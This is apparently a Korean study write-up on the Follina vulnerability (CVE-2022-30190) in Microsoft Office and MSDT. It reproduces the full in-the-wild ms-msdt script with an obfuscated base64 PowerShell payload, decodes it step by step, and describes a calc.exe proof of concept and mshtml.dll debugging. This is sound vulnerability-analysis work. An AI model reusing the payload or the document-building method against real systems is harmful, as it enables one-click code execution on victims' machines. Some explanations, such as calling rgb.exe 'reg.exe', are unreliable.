# CVE-2022-30190 분석

# 개요

CVE-2022-30190 폴리나 취약점은 현존하는 모든 윈도 버전에 존재하며, 악성 오피스 문서를 열어보게 함으로써 익스플로잇 할 수 있다. 익스플로잇에 성공한 공격자는 피해자의 시스템을 원격에서 조정할 수 있게 된다.

- Word와 같은 호출 응용프로그램에서 URL 프로토콜을  이용하여 MSDT를 호출할 때 원격코드실행 취약점이 발견

먼저 사전에 공개되었던 보고서를 확인 해보면 아래와 같다.

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/40b48266-a83a-420c-b47e-84679c037391)

word/ _rels/ 폴더 안에는 “https://www[.]xmlformats[.]com/offic/~/RDF842l[.]html 에 대한 외부 참조가 포함된 document.xml.rels 파일이 있다.

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/e23bf17b-3191-42b0-a008-dd89d886deb6)

- document.xml.rels 내용

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/365e294f-59a9-47a3-bf5e-4e4d4021d9ba)

{임의제목}.html의 내용은 위와 같으며 ms-msdt를 실행하는 코드가 삽입되어 있다. 이러한 형태로 ms-msdt를 통해 공격자가 의도한 코드 실행이 가능하므로 다양한 공격이 가능해진다.

삽입된 코드를 하나씩 분석해보면 아래와 같다.

```
<script>
window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+[char]34+'))'))))i/../../../../../../../../../../../../../..//Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
</script>
```

- **window.location.href**
    - 자바스크립트에 내장된 객체로 읽거나,쓰거나, 현재 페이지를 새로고침하거나 다른 페이지로 이동을 한다.
- **ms-msdt**
    - (Microsoft Support Diagnostic Tool) MSDT 실행을 하기위한 프로토콜
- **/id PCWDiagnostic**
    - MSDT에서 실행할 진단 ID를 지정한다.
- **/skip force**
    - MSDT 실행 시 강제로 진행하는 과정을 건너뛰도록 설정한다. 이 경우 "force" 옵션을 사용
- **/param**
    - MSDT에 전달할 추가 매개 변수를 지정한다. 이 경우 **`IT_RebrowseForFile`**, **`IT_LaunchMethod`**, **`IT_SelectProgram`**, **`IT_BrowseForFile`** 매개 변수가 지정된다.
        - **`IT_RebrowseForFile`**: 파일 선택 대화상자에서 파일을 다시 선택할 수 있는 옵션입니다. **`cal?c`** 값은 파일 선택 대화상자에서 특정 파일 형식을 필터링하는 것으로 보입니다.
        - **`IT_LaunchMethod`**: 애플리케이션을 실행하는 방법을 지정합니다. 이 경우 "ContextMenu"을 사용하여 오른쪽 마우스 버튼으로 실행하는 것을 의미합니다.
        - **`IT_SelectProgram`**: 실행할 프로그램을 사용자가 지정할 수 없는 경우 "NotListed" 값을 사용하여 선택 목록에서 프로그램을 제거합니다.
        - **`IT_BrowseForFile`**: 파일 선택 대화상자를 표시하는 옵션입니다.
- **Base64encode 복호화**
    - $cmd = "c:\windows\system32\cmd.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&&for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c -F:* .&&rgb.exe";

**아래는 복호화 된 순서 내용이다.**

1. 프로세스 msdt.exe를 종료한다.
2. “C:\users\public\” 경로부터 05-2022-0438.rar 찾아서 1.rar 이름으로 복사한다.
3. 1.rar 에서 “TVNDRgAAAA” 문자열을 찾아서 1.t로 저장한다.
4. certutil 도구를 사용해서 1.t 파일의 내용을 저장한다. 그리고 디코딩된 결과를 1.c 파일에 저장한다.
5. 1.c CAB 파일을 현재 디렉터리로 확장 하고 마지막으로 다음을 수행한다.
6. rgb.exe 실행(아마 1.c CAB 파일 내부에 압축됨)
    1. reg.exe의 영향은 구체적으로 알려지지 않았지만 중요한 점은 이것이 단 한번의 클릭으로 악성 행위 코드 실행이 된다.

# 취약점 분석

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/f8a0d518-89a2-4bcc-85f9-908a19f1a745)

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/59dc9339-ae20-45b9-9b05-953992a8c622)

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/8b332e5a-fda7-4bdc-a92b-22d5409a4ae1)

현재 CVE 취약점을 이용해 악의적인 <Script> 임의 실행 코드를 만드는 과정이다.

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/2160d1df-bec2-49ba-807f-2f17b1837802)


문서를 실행하면 임의 코드 (”calc.exe”) 실행이 된다.

결과부터 작성하였지만 과정을 조금 더 상세히 작성하면

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/7dc7dd1f-8157-425f-b4e1-215e5b92164d)

http://192.168[.]1.213:9999/index.htm[l](http://192.168.1.213:9999/index.html) 패키지 외부의 리소스를 참조한다.

문제 접근 방식은 아래와 같다.

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/7dc7dd1f-8157-425f-b4e1-215e5b92164d)

Context 내부를 사용하여 관련 작업을 찾는다. Javascript의 실행을 살펴보고 있었기 때문에 “script” 단어가 포함된 작업을 찾아 본다.

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/74798862-4037-48a3-82ef-979ad3d6c719)

- **mshtml**.**dll** 파일의 기능은 HTML로 이루어진 웹 소스를 화면에 뿌려줄때 사용되는 DLL 파일이다.

**현재 패치가 되어서 1-day 환경을 구성해서 분석이 힘든 상황이다. 그래서 아래의 글을 참고하면 된다.**

[Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit](https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/)

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/79b7236c-79d5-4156-8dd6-5be2008d80bd)

현재는 분석 내용처럼 피들러를 확인한 결과 4096 확인 할 수가 없었다.

## 취약점 분석 과정 요약

1. Windows에서 HTML 처리를 담당하는 기본 모듈은 “Microsoft HTML 뷰어”인 MSHTML.DLL 이다.HTML 렌더링에서 Javascript 실행에 이르기 까지 거의 모든 것이 포함되어 있기 때문에 바이너리 크기만 해도 22MB 이다. 예를 들어 Microsoft는 Internet Explorer(및 Word)에서 사용되는 이 바이너리에 자체 JavaScript 엔진을 가지고 있다.
2. 취약점에서 발생되는 Context 내에 Javascript 실행이 되기 때문에 Jscript9.dll 스택 구조를 Procmon을 통해 확인
3. jscript9.dll 모듈 로드의 스택 추적을 하면 mshtml.dll 참조하는 것을 알 수 있다.
4. mshtml.dll IDA Pro를 통해 “PostManExecute” 함수가 실행 되기 위한 1차 관문이다. Payload 실행하면 성공 시에는 “PostManExecute” 함수가 실행이 되고, 실패 시에는 호출이 되지 않는다.
5. 호출 되지 않는 이유는 “PostManExecute”가 비동기 스레드에서 호출되는 콜백의 결과인 것처럼 보인다.
6. 비동기 디스패치인 CDwnChan::OnMethodCall 직후에 호출되는 함수에 대한 상호 참조를 살펴보면 CDwnChan::Signal이라는 다른 함수에서 참조 하고 있다.
7. “_GWPostMethodCallEx” 함수 대한 참조를 보면 HTML 처리와 관련된 것을 모두 볼 수 있다.
8. Terminate 함수를 호출하는 CDwnBindData::Read 함수를 디버깅했을 때 CDwnStm::Read에 대한 호출이 성공 경로에서 작동했지만 실패 경로에서 오류를 반환하는 것을 발견
9. 4096 값이 다른 개체 생성자인 CEncodeReader::CEncodeReader 내부에 설정되었다. 이 생성자는 방금 연결한 CHtmPre 생성자에 의해 인스턴스화 되었는데 그때 4096은  **CHtmPre 생성자에 하드코딩되어 있었다.**
10. 공격자의 Payload 작동한 이유는 크기가 4096바이트 이상이었기 때문이다.

## 취약점 이해

윈도우에서 HTML 처리(MSHTML.dll)하는 과정이 미흡하여 [4096] 크기가 고정되어 있어, 그 이상의 값을 전송하면 Payload가 실행되지만, 그 이하 값은 Payload 실행이 되지 않고 종료됩니다. 그래서 Word에서 HTML <script> 코드를 참조할 때 더미값 4096개 이상을 준 이유도 Payload를 실행시키기 위해서 더미값을 4096 만큼 주었고, 그 후 임의 코드로 실행시켰습니다.

# 용어

**MSDT는 Windows 운영체제에서 발생할 수 있는 문제를 진단하고 해결하는 도구**

**ms-msdt는 Microsoft Support Diagnostic Tool (MSDT)를 실행하기 위한 프로토콜**

- 명령 프롬프트나 PowerShell 등에서 실행할 수 있으며, MSDT를 사용하여 문제를 진단하고 해결하는 데 사용
- Windows 운영체제에 기본적으로 내장되어 있으며, 사용자가 별도의 설치 없이 바로 사용

# 패치 내역

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/31240da0-d6a7-4d11-9a36-da92d2011f91)

# 참조
  
  https://github.com/Hrishikesh7665/Follina_Exploiter_CLI
  https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug
